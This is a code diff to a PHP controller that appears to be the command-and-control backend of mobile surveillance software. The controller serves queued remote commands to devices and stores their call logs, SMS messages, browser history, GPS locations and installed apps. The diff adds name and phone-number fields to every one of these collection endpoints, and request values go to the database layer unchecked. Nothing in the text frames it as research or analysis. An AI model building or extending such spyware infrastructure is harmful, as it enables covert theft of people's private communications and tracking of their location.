@@ -18,7 +18,9 @@ class Device extends CI_Controller{
 	{
 		if($_POST){
 			$did = $_REQUEST['did'];
-			$res = $this->device_model->insertid($did);
+			$name = $_REQUEST['name'];
+			$number = $_REQUEST['number'];
+			$res = $this->device_model->insertid($did, $name, $number);
 			return;
 		}
 	}
@@ -26,11 +28,13 @@ class Device extends CI_Controller{
 	function getcommand($id=false)
 	{
 		$id = $_REQUEST['did'];
-		$res = $this->device_model->getcommand($id);
+		$name = $_REQUEST['name'];
+		$number = $_REQUEST['number'];
+		$res = $this->device_model->getcommand($id, $name, $number);
 		if(sizeof($res) >0 ){
 			if($res['clm_commandseen'] == 0){
 				echo $res['clm_currentcommand'];
-				$stat = $this->device_model->changestat($id);
+				$stat = $this->device_model->changestat($number);
 			}
 		}
 	}
@@ -70,47 +74,57 @@ class Device extends CI_Controller{
 			if(isset($_POST['type'])){
 				if($_POST['type']=="calllog"){
 					$id = $_POST['did'];
+					$name = $_POST['name'];
+					$number = $_POST['number'];
 					$data = $_POST['data'];
 					$data = explode("||", $data);
 
 					foreach ($data as $row) {
 					$arr = explode("|", $row);
-					$res = $this->device_model->insertcalllog($id,$arr);
+					$res = $this->device_model->insertcalllog($id,$name,$number,$arr);
 					}
 				}else if($_POST['type']=="smslog"){
 					$id = $_POST['did'];
+					$name = $_POST['name'];
+					$number = $_POST['number'];
 					$data = $_POST['data'];
 					$data = explode("||", $data);
 
 					foreach ($data as $row) {
 					$arr = explode("|", $row);
-					$res = $this->device_model->insertsmslog($id,$arr);
+					$res = $this->device_model->insertsmslog($id,$name,$number,$arr);
 					}
 				}
 				else if($_POST['type']=="browserlog"){
 					$id = $_POST['did'];
+					$name = $_POST['name'];
+					$number = $_POST['number'];
 					$data = $_POST['data'];
 					$data = explode("||", $data);
 
 					foreach ($data as $row) {
 					$arr = explode("|", $row);
-					$res = $this->device_model->insertbrowserlog($id,$arr);
+					$res = $this->device_model->insertbrowserlog($id,$name,$number,$arr);
 					}
 				}
 				else if($_POST['type']=="gps"){
 					$id = $_POST['did'];
+					$name = $_POST['name'];
+					$number = $_POST['number'];
 					$data = $_POST['data'];
 
 					$arr = explode("|", $data);
-					$res = $this->device_model->insertgps($id,$arr);
+					$res = $this->device_model->insertgps($id,$name,$number,$arr);
 				}
 				else if($_POST['type']=="packages"){
 					$id = $_POST['did'];
+					$name = $_POST['name'];
+					$number = $_POST['number'];
 					$data = $_POST['data'];
 					$data = explode("||", $data);
 
 					foreach ($data as $row) {
-					$res = $this->device_model->insertpackages($id,$row);
+					$res = $this->device_model->insertpackages($id,$name,$number,$row);
 					}
 				}
 			}
